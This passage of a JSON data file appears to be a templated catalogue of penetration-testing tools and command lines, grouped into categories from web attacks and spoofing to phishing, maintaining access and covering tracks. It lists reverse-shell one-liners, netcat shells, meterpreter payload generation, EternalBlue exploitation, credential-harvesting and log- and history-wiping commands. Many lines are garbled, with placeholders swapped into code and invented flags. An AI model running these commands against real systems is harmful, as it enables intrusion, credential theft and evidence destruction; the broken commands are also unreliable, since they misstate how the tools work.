                "nikto -h https://{DOMAIN} -ssl -id USER:PASS -output nikto_report.xml"
            ],
            "SQLmap": [
                "sqlmap -u \"http://{DOMAIN}/{DOMAIN}?id={PORT}\" --risk={PORT} --level={PORT} --batch",
                "sqlmap -u \"http://{DOMAIN}/{DOMAIN}?id={PORT}\" --dbs --threads={PORT}",
                "sqlmap -u \"http://{DOMAIN}/{DOMAIN}?id={PORT}\" --dump --threads={PORT}"
            ],
            "Arachni": [
                "arachni http://{DOMAIN} --output-only-positives --report-save-path arachni_report.afr",
                "arachni http://{DOMAIN} --checks xss,sql_injection --output-format json",
                "arachni http://{DOMAIN} --scope-exclude-paths '/{USERNAME}/*' --report-save-path arachni_exclude.afr"
            ],
            "BeEF (Browser Exploitation Framework)": [
                "beef -x -c /usr/share/beef-xss/{DOMAIN}",
                "beef -c /etc/beef/{DOMAIN} -d",
                "beef -c /path/to/custom/{DOMAIN} -v"
            ],
            "DirBuster": [
                "dirbuster -u http://{DOMAIN} -l /usr/share/dirbuster/wordlists/{DOMAIN} -t {PORT} -x php,html,txt -o dirbuster_report.txt",
                "dirbuster -u http://{DOMAIN} -l /usr/share/dirbuster/wordlists/{DOMAIN} -t {PORT} -x aspx,js -o dirbuster_report_small.txt",
                "dirbuster -u http://{DOMAIN} -l /usr/share/dirbuster/wordlists/{DOMAIN} -t {PORT} -x jsp,py -o dirbuster_report_large.txt"
            ],
            "Gobuster": [
                "gobuster dir -u http://{DOMAIN} -w /usr/share/wordlists/dirbuster/{DOMAIN} -t {PORT} -o gobuster_dir.txt",
                "gobuster dns -d {DOMAIN} -w /usr/share/wordlists/dns/{DOMAIN} -t {PORT} -o gobuster_dns.txt",
                "gobuster vhost -u http://{DOMAIN} -w /usr/share/wordlists/{DOMAIN} -t {PORT} -o gobuster_vhost.txt"
            ],
            "XSStrike": [
                "xsstrike -u http://{DOMAIN}/{DOMAIN}?param={PORT} --crawl",
                "xsstrike -u http://{DOMAIN}/{DOMAIN}?q=test --crawl --report xsstrike_report.html",
                "xsstrike -u http://{DOMAIN}/{DOMAIN}?param={PORT} --payload \"<script>alert({PORT})</script>\""
            ],
            "Intruder": [
                "intruder -u http://{DOMAIN}/{DOMAIN} -l {DOMAIN} -p {DOMAIN} -o intruder_report.html",
                "intruder --url http://{DOMAIN}/{DOMAIN} -u param -l {DOMAIN} -o intruder_output.txt",
                "intruder -u http://{DOMAIN}/{DOMAIN}?q=test -f sql_injection_payloads.txt -o intruder_sql_report.json"
            ],
            "IronWASP": [
                "ironwasp -s /path/to/{DOMAIN}",
                "ironwasp --scan http://{DOMAIN} --output ironwasp_report.html",
                "ironwasp --test XSS -u http://{DOMAIN}/{DOMAIN}?q=test --output xss_report.xml"
            ]
        }
    },
    "Sniffing and Spoofing": {
        "tools": [
            "Wireshark",
            "Bettercap",
            "Ettercap",
            "dsniff",
            "tcpdump",
            "MITMf (Man-In-The-Middle Framework)",
            "SSLstrip",
            "ARPSpoof",
            "MITMproxy",
            "Scapy",
            "Netcut",
            "Ghost Phisher"
        ],
        "commands": {
            "Wireshark": [
                "wireshark -i {INTERFACE} -k",
                "wireshark -r {DOMAIN}",
                "wireshark -Y \"{DOMAIN}\" -i {INTERFACE} -w http_requests.pcap"
            ],
            "Bettercap": [
                "bettercap -iface {INTERFACE} -eval \"{DOMAIN} on; {DOMAIN} on; {DOMAIN} on\"",
                "bettercap -iface {INTERFACE} -X",
                "bettercap -iface {INTERFACE} --sniffer off --proxy off"
            ],
            "Ettercap": [
                "ettercap -T -q -i {INTERFACE} -M arp:remote /{TARGET_IP}// /{TARGET_IP}//",
                "ettercap -G",
                "ettercap -T -q -i {INTERFACE} -M arp:oneway /target_ip// /gateway_ip//"
            ],
            "dsniff": [
                "dsniff -i {INTERFACE}",
                "dsniff -w dsniff_output.pcap -i {INTERFACE}",
                "dsniff -a -i {INTERFACE} -o dsniff_log.txt"
            ],
            "tcpdump": [
                "tcpdump -i {INTERFACE} -w {DOMAIN}",
                "tcpdump -i {INTERFACE} -s {PORT} -w full_capture.pcapng",
                "tcpdump -i {INTERFACE} -n -vvv port {PORT} or port {PORT} -w http_https.pcap"
            ],
            "MITMf (Man-In-The-Middle Framework)": [
                "mitmf --arp --spoof --gateway {TARGET_IP} --target {TARGET_IP}",
                "mitmf --dns --spoof --gateway {TARGET_IP} --target {TARGET_IP} -o mitmf_dns.log",
                "mitmf --http2 https://{DOMAIN} --spoof --gateway {TARGET_IP} --target {TARGET_IP}"
            ],
            "SSLstrip": [
                "sslstrip -l {PORT} -w {DOMAIN}",
                "sslstrip -a -f -w sslstrip_full.log",
                "sslstrip --listen-port={PORT} --output=sslstrip_output.txt"
            ],
            "ARPSpoof": [
                "arpspoof -i {INTERFACE} -t {TARGET_IP} {TARGET_IP}",
                "arpspoof -i {INTERFACE} -t {TARGET_IP} {TARGET_IP}",
                "arpspoof -i {INTERFACE} -t {TARGET_IP} {TARGET_IP}"
            ],
            "MITMproxy": [
                "mitmproxy --mode transparent -i {INTERFACE}",
                "mitmproxy -s /path/to/{DOMAIN}",
                "mitmproxy --listen-port {PORT} --mode regular"
            ],
            "Scapy": [
                "scapy -c 'sniff(iface=\"{INTERFACE}\", filter=\"tcp port {PORT}\", prn=hexdump)'",
                "scapy -c 'send(IP(dst=\"{TARGET_IP}\")/TCP(dport={PORT}, flags=\"S\"))'",
                "scapy -c 'sr1(ARP(op={PORT}, pdst=\"{TARGET_IP}\", hwdst=\"{PORT}:{PORT}:{PORT}:{PORT}:{PORT}:{PORT}\"))'"
            ],
            "Netcut": [
                "netcut -i {INTERFACE} -t {TARGET_IP}",
                "netcut -i {INTERFACE} -b {TARGET_IP}",
                "netcut --block {TARGET_IP} -i {INTERFACE}"
            ],
            "Ghost Phisher": [
                "ghost-phisher -m sniffer -o ghost_sniff.pcap",
                "ghost-phisher -m evilap -e \"FakeAP\" -o ghost_evilap.log",
                "ghost-phisher -m wifi -p {INTERFACE} -o ghost_wifi.log"
            ]
        }
    },
    "Social Engineering": {
        "tools": [
            "Social-Engineer Toolkit (SET)",
            "BeEF (Browser Exploitation Framework)",
            "King Phisher",
            "Gophish",
            "MSFvenom",
            "Phishery",
            "Evilginx",
            "Zed Attack Proxy (ZAP)",
            "Credential Harvester",
            "HiddenEye"
        ],
        "commands": {
            "Social-Engineer Toolkit (SET)": [
                "setoolkit -t spearphishing -i email@{DOMAIN} -o {DOMAIN}",
                "setoolkit -t website_attack -u http://{DOMAIN} -o beef_hook.js",
                "setoolkit -t credential_harvester -p http://{DOMAIN}/login -o {DOMAIN}"
            ],
            "BeEF (Browser Exploitation Framework)": [
                "beef -x -c /usr/share/beef-xss/{DOMAIN}",
                "beef -c /etc/beef/{DOMAIN} -d",
                "beef -c /path/to/custom/{DOMAIN} -v"
            ],
            "King Phisher": [
                "king-phisher --config /path/to/{DOMAIN}",
                "king-phisher --create-campaign -n \"Phishing Campaign\"",
                "king-phisher --launch -c campaign_config.yaml"
            ],
            "Gophish": [
                "gophish -config /path/to/gophish_config.json",
                "gophish --test",
                "gophish --email-template {DOMAIN} --landing-page {DOMAIN} --smtp-server {DOMAIN}"
            ],
            "MSFvenom": [
                "msfvenom -p windows/meterpreter/reverse_tcp LHOST={TARGET_IP} LPORT={PORT} -f exe -o {DOMAIN}",
                "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={TARGET_IP} LPORT={PORT} -f elf > {DOMAIN}",
                "msfvenom -p php/meterpreter/reverse_tcp LHOST={TARGET_IP} LPORT={PORT} -f raw > {DOMAIN}"
            ],
            "Phishery": [
                "phishery --create-website -n \"PhishingSite\" -o phishery_site.html",
                "phishery --send-email -t target@{DOMAIN} -s \"Security Update\" -b phishery_site.html",
                "phishery --monitor -i /var/log/{DOMAIN}"
            ],
            "Evilginx": [
                "evilginx -l {PORT} -t {DOMAIN}",
                "evilginx -l {PORT} -t {DOMAIN} -o evilginx_config.yaml",
                "evilginx --list-sites"
            ],
            "Zed Attack Proxy (ZAP)": [
                "{DOMAIN} -daemon -port {PORT} -config {DOMAIN}=123456",
                "zap-cli quick-scan -r http://{DOMAIN}",
                "zap-cli active-scan -r http://{DOMAIN} -s xss,sql_injection"
            ],
            "Credential Harvester": [
                "credential_harvester -u http://{DOMAIN}/login -o harvester_report.html",
                "credential_harvester --target http://{DOMAIN} -w harvester_wordlist.txt -o harvester_output.json",
                "credential_harvester -i http://{DOMAIN}/signup -o harvester_signup.txt"
            ],
            "HiddenEye": [
                "hiddeneye -l http://{DOMAIN} -p {PORT}",
                "hiddeneye --site {DOMAIN} --port {PORT}",
                "hiddeneye -s -l http://{DOMAIN}/login -o hiddeneye_output.log"
            ]
        }
    },
    "Reverse Engineering": {
        "tools": [
            "Ghidra",
            "Radare2",
            "OllyDbg",
            "IDA Pro",
            "Binary Ninja",
            "Cutter",
            "x64dbg",
            "Immunity Debugger",
            "apktool",
            "Dex2jar",
            "Jadx",
            "Frida",
            "Capstone"
        ],
        "commands": {
            "Ghidra": [
                "ghidraRun -import /path/to/{DOMAIN}",
                "ghidraRun -scriptPath /path/to/scripts -process /path/to/{DOMAIN}",
                "ghidraRun -batch /path/to/{DOMAIN}"
            ],
            "Radare2": [
                "r2 -A /path/to/binary",
                "r2 -c 'aaa; pdf @ main' /path/to/binary",
                "r2 -d /path/to/binary"
            ],
            "OllyDbg": [
                "{DOMAIN} /p /r /t /c {DOMAIN} /o {DOMAIN}",
                "{DOMAIN} -start /p /file {DOMAIN}",
                "{DOMAIN} /dbg /f /c {DOMAIN} /o olly_output.log"
            ],
            "IDA Pro": [
                "{DOMAIN} /A /S/path/to/{DOMAIN} /path/to/{DOMAIN}",
                "{DOMAIN} -A -S/path/to/{DOMAIN} /path/to/{DOMAIN}",
                "{DOMAIN} -B -S/path/to/{DOMAIN} /path/to/{DOMAIN}"
            ],
            "Binary Ninja": [
                "binaryninja --script /path/to/{DOMAIN} /path/to/binary",
                "binaryninja --batch --script /path/to/{DOMAIN} /path/to/binary",
                "binaryninja --auto-analysis --script /path/to/{DOMAIN} /path/to/binary"
            ],
            "Cutter": [
                "cutter -c /path/to/cutter_script.py /path/to/binary",
                "cutter --headless -c /path/to/{DOMAIN} -o {DOMAIN} /path/to/binary",
                "cutter -A /path/to/binary -o cutter_output.html"
            ],
            "x64dbg": [
                "{DOMAIN} /c /s /p /file {DOMAIN}",
                "{DOMAIN} /l /o /file {DOMAIN}",
                "{DOMAIN} /dbg /file {DOMAIN} /c {DOMAIN}"
            ],
            "Immunity Debugger": [
                "{DOMAIN} -r /path/to/{DOMAIN} -c /path/to/{DOMAIN}",
                "{DOMAIN} -p /path/to/{DOMAIN} -s /path/to/{DOMAIN}",
                "{DOMAIN} -d /path/to/{DOMAIN} -c /path/to/{DOMAIN}"
            ],
            "apktool": [
                "apktool d {DOMAIN} -o app_decompiled",
                "apktool b app_decompiled -o app_rebuilt.apk",
                "apktool if {DOMAIN}"
            ],
            "Dex2jar": [
                "{DOMAIN} {DOMAIN} -o {DOMAIN}",
                "{DOMAIN} {DOMAIN}",
                "{DOMAIN} /path/to/{DOMAIN} -o {DOMAIN}"
            ],
            "Jadx": [
                "jadx -d output_dir /path/to/{DOMAIN}",
                "jadx --deobf -d output_dir /path/to/{DOMAIN}",
                "jadx -r -d output_dir /path/to/{DOMAIN}"
            ],
            "Frida": [
                "frida -U -f {DOMAIN} -l {DOMAIN} --no-pause",
                "frida -U -n example_process -l {DOMAIN}",
                "frida -U -f {DOMAIN} -e \"{DOMAIN}({DOMAIN}(null, 'open'), { onEnter: function(args) { {DOMAIN}('open called'); } });\""
            ],
            "Capstone": [
                "capstone -i -m ARM -f little /path/to/binary",
                "capstone -i -m x86 -f {PORT} /path/to/binary",
                "capstone -i -m MIPS -f big /path/to/binary"
            ]
        }
    },
    "Reporting Tools": {
        "tools": [
            "Dradis",
            "MagicTree",
            "Faraday",
            "Serpico",
            "CaseFile",
            "Metasploit Pro",
            "Burp Suite Professional",
            "MantisBT",
            "KeepNote",
            "Seas0nPass",
            "Pico",
            "Vega Report"
        ],
        "commands": {
            "Dradis": [
                "dradis -c config/{DOMAIN}",
                "dradis -i import/{DOMAIN}",
                "dradis -e export/{DOMAIN}"
            ],
            "MagicTree": [
                "magictree --import {DOMAIN}",
                "magictree --generate {DOMAIN}",
                "magictree --export {DOMAIN}"
            ],
            "Faraday": [
                "faraday-server -d /path/to/data",
                "faraday-client -c connect -h {TARGET_IP}",
                "faraday-cli export -f {DOMAIN}"
            ],
            "Serpico": [
                "serpico -i import_scan.xml",
                "serpico -g generate_report -t pdf",
                "serpico -e export_findings.json"
            ],
            "CaseFile": [
                "casefile -c create new_case",
                "casefile -a add_findings {DOMAIN}",
                "casefile -r generate_report {DOMAIN}"
            ],
            "Metasploit Pro": [
                "msfpro -c config/{DOMAIN}",
                "msfpro -l -f project_list.json",
                "msfpro -e -p project1 -o metasploit_report.html"
            ],
            "Burp Suite Professional": [
                "java -jar burpsuite_pro.jar --config-file /path/to/{DOMAIN}",
                "burpsuite_pro -t http://{DOMAIN} -o burp_pro_report.html",
                "burpsuite_pro -d /path/to/project -o burp_pro_export.xml"
            ],
            "MantisBT": [
                "mantisbt -c config/{DOMAIN}",
                "mantisbt --import {DOMAIN}",
                "mantisbt --export {DOMAIN}"
            ],
            "KeepNote": [
                "keepnote -i import_notes.knt",
                "keepnote -e export_report.pdf",
                "keepnote -c create new_note.knt"
            ],
            "Seas0nPass": [
                "seas0npass --generate -o seas0npass_payload.bin",
                "seas0npass --convert -i seas0npass_payload.bin -o {DOMAIN}",
                "seas0npass --verify -i {DOMAIN}"
            ],
            "Pico": [
                "pico -i {DOMAIN} -o pico_output.txt",
                "pico --analyze {DOMAIN} -o pico_report.html",
                "pico --scan {DOMAIN} -o pico_scan.txt"
            ],
            "Vega Report": [
                "vega -r scan_report.html",
                "vega --export-json vega_report.json",
                "vega --generate-pdf vega_report.pdf"
            ]
        }
    },
    "Miscellaneous Tools": {
        "tools": [
            "Kali Linux",
            "Snort",
            "Kismet",
            "Cuckoo Sandbox",
            "Volatility",
            "Docker",
            "Vagrant",
            "VirtualBox",
            "VMware",
            "GPG",
            "Tor",
            "Proxychains",
            "Netcat",
            "Terminator",
            "tmux",
            "Metasploit Framework",
            "BeEF",
            "Cobalt Strike",
            "Autopsy",
            "Binwalk",
            "ExifTool",
            "Foremost",
            "Hash-identifier",
            "The Sleuth Kit",
            "Binjitsu",
            "Mitmproxy",
            "PowerShell Empire",
            "FuzzDB"
        ],
        "commands": {
            "Kali Linux": [
                "sudo apt update && sudo apt upgrade -y",
                "sudo apt install <tool_name>",
                "sudo reboot"
            ],
            "Snort": [
                "snort -c /etc/snort/{DOMAIN} -i {INTERFACE}",
                "snort -A console -c /etc/snort/{DOMAIN} -i {INTERFACE}",
                "snort -q -c /etc/snort/{DOMAIN} -i {INTERFACE} -l /var/log/snort"
            ],
            "Kismet": [
                "kismet -c wlan0mon",
                "kismet -c wlan0mon -o kismet_output.kismet",
                "kismet --enable-protocols={PORT}.{PORT},{PORT}.11a -c wlan0mon"
            ],
            "Cuckoo Sandbox": [
                "cuckoo -d",
                "cuckoo submit /path/to/{DOMAIN}",
                "cuckoo report --format json --output cuckoo_report.json"
            ],
            "Volatility": [
                "volatility -f {DOMAIN} --profile=Win7SP1x64 pslist",
                "volatility -f {DOMAIN} --profile=Win7SP1x64 malfind",
                "volatility -f {DOMAIN} --profile=Win7SP1x64 hashdump"
            ],
            "Docker": [
                "docker run -d -p {PORT}:{PORT} nginx",
                "docker build -t myapp .",
                "docker ps -a"
            ],
            "Vagrant": [
                "vagrant init ubuntu/bionic64",
                "vagrant up",
                "vagrant ssh"
            ],
            "VirtualBox": [
                "VBoxManage createvm --name \"TestVM\" --ostype Ubuntu_64 --register",
                "VBoxManage modifyvm \"TestVM\" --memory {PORT} --cpus {PORT}",
                "VBoxManage startvm \"TestVM\" --type headless"
            ],
            "VMware": [
                "vmrun -T ws start /path/to/{DOMAIN}",
                "vmrun -T ws stop /path/to/{DOMAIN}",
                "vmrun -T ws list"
            ],
            "GPG": [
                "gpg --full-generate-key",
                "gpg --encrypt --recipient {USERNAME}@{DOMAIN} {DOMAIN}",
                "gpg --decrypt {DOMAIN}"
            ],
            "Tor": [
                "tor",
                "tor --config /etc/tor/torrc",
                "sudo service tor start"
            ],
            "Proxychains": [
                "proxychains firefox http://{DOMAIN}",
                "proxychains nmap -sT -p {PORT} {DOMAIN}",
                "proxychains curl http://{DOMAIN}"
            ],
            "Netcat": [
                "nc -lvp {PORT} -e /bin/bash",
                "nc -nv {TARGET_IP} {PORT} -e /bin/sh",
                "nc -c bash -l -p {PORT}"
            ],
            "Terminator": [
                "terminator",
                "terminator --new-tab -e 'htop'",
                "terminator --layout=custom_layout.config"
            ],
            "tmux": [
                "tmux new -s session_name",
                "tmux attach -t session_name",
                "tmux kill-session -t session_name"
            ],
            "Metasploit Framework": [
                "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {TARGET_IP}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {TARGET_IP}; exploit'",
                "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={TARGET_IP} LPORT={PORT} -f elf > {DOMAIN}",
                "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {TARGET_IP}; exploit'"
            ],
            "BeEF (Browser Exploitation Framework)": [
                "beef -x -c /usr/share/beef-xss/{DOMAIN}",
                "beef -c /etc/beef/{DOMAIN} -d",
                "beef -c /path/to/custom/{DOMAIN} -v"
            ],
            "Cobalt Strike": [
                "cobaltstrike -c beacon_payload.cna -f {DOMAIN} -o beacon_output",
                "cobaltstrike -p server_payload.ps1 -o server_output",
                "cobaltstrike -t teamserver_address -u {USERNAME} -p {PASSWORD}"
            ],
            "Autopsy": [
                "autopsy -no-browser -data /path/to/case",
                "autopsy --add-file /path/to/{DOMAIN}",
                "autopsy --export-report /path/to/{DOMAIN}"
            ],
            "Binwalk": [
                "binwalk -e {DOMAIN}",
                "binwalk -M -e {DOMAIN}",
                "binwalk --dd='.*.zip' {DOMAIN}"
            ],
            "ExifTool": [
                "exiftool {DOMAIN}",
                "exiftool -all= -overwrite_original {DOMAIN}",
                "exiftool -tagsFromFile {DOMAIN} -all:all {DOMAIN}"
            ],
            "Foremost": [
                "foremost -i /path/to/{DOMAIN} -o /recovery_output/",
                "foremost -i /path/to/{DOMAIN} -t jpg,png,exe -o /recovery/",
                "foremost -i /dev/sda1 -o /output_folder/"
            ],
            "Hash-identifier": [
                "hash-identifier {DOMAIN}",
                "hash-identifier -f {DOMAIN}",
                "hash-identifier --mode {PORT} {DOMAIN}"
            ],
            "The Sleuth Kit": [
                "tsk_recover -e /path/to/{DOMAIN} /output/recovered_files/",
                "fls -r -f ntfs -o {PORT} /path/to/{DOMAIN}",
                "icat -f ntfs -o {PORT} /path/to/{DOMAIN} {PORT} > extracted_file.txt"
            ],
            "Binjitsu": [
                "binjitsu -d /path/to/binary -o binjitsu_output.txt",
                "binjitsu --analyze /path/to/binary --output binjitsu_report.html",
                "binjitsu -f /path/to/binary -o binjitsu_full.log"
            ],
            "Mitmproxy": [
                "mitmproxy --mode transparent -i {INTERFACE}",
                "mitmproxy -s /path/to/{DOMAIN}",
                "mitmproxy --listen-port {PORT} --mode regular"
            ],
            "PowerShell Empire": [
                "{DOMAIN} -ExecutionPolicy Bypass -File empire.ps1",
                "empire --listener HTTP --port {PORT}",
                "empire --download /path/to/{DOMAIN}"
            ],
            "FuzzDB": [
                "fuzzdb-search -t /path/to/{DOMAIN} --search \"{USERNAME}\"",
                "fuzzdb-payloads --input /path/to/{DOMAIN} --output fuzzdb_payloads.json",
                "fuzzdb-generator -o generated_fuzzdb.txt"
            ]
        }
    },
    "Maintaining Access": {
        "tools": [
            "Netcat",
            "Weevely",
            "Reverse Shells",
            "Empire",
            "Metasploit Persistence"
        ],
        "commands": {
            "Netcat": [
                "nc -lvp {PORT} -e /bin/bash",
                "nc -nv {TARGET_IP} {PORT} -e /bin/sh",
                "nc -c bash -l -p {PORT}"
            ],
            "Weevely": [
                "weevely generate {PASSWORD} {DOMAIN}",
                "weevely {DOMAIN} {PASSWORD}",
                "weevely https://{DOMAIN}/{DOMAIN} {PASSWORD}"
            ],
            "Reverse Shells": [
                "bash -i >& /dev/tcp/{TARGET_IP}/{PORT} {PORT}>&{PORT}",
                "python -c 'import socket,subprocess,os;s={DOMAIN}(socket.AF_INET,socket.SOCK_STREAM);{DOMAIN}((\"{TARGET_IP}\",{PORT}));os.dup2({DOMAIN}(),{PORT}); os.dup2({DOMAIN}(),{PORT}); os.dup2({DOMAIN}(),{PORT}); {DOMAIN}([\"/bin/sh\",\"-i\"])'",
                "php -r '$sock=fsockopen(\"{TARGET_IP}\",{PORT});exec(\"/bin/sh -i <&{PORT} >&{PORT} {PORT}>&{PORT}\");'"
            ],
            "Empire": [
                "usemodule persistence/windows/registry; set AgentName agent1; execute",
                "usemodule persistence/macos/plist; set AgentName agent2; execute",
                "usemodule persistence/linux/init.d; set AgentName agent3; execute"
            ],
            "Metasploit Persistence": [
                "use exploit/windows/local/persistence; set SESSION {PORT}; exploit",
                "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {TARGET_IP}; exploit",
                "use post/windows/manage/migrate; set SESSION {PORT}; run"
            ]
        }
    },
    "Covering Tracks": {
        "tools": [
            "BleachBit",
            "CCleaner",
            "Log Cleaner",
            "Tmux",
            "History Cleaner"
        ],
        "commands": {
            "BleachBit": [
                "bleachbit -c {DOMAIN}",
                "bleachbit -c {DOMAIN}",
                "bleachbit -c {DOMAIN}"
            ],
            "CCleaner": [
                "ccleaner /AUTO",
                "ccleaner /SILENT /AUTO",
                "ccleaner /CLEAN"
            ],
            "Log Cleaner": [
                "echo '' > /var/log/{DOMAIN}",
                "echo '' > /var/log/syslog",
                "rm -f /var/log/*.log"
            ],
            "Tmux": [
                "tmux kill-session -t session_name",
                "tmux detach-client -s session_name",
                "tmux send-keys -t session_name 'exit' C-m"
            ],
            "History Cleaner": [
                "history -c",
                "unset HISTFILE",
                "export HISTSIZE={PORT}"
            ]
        }
    }
}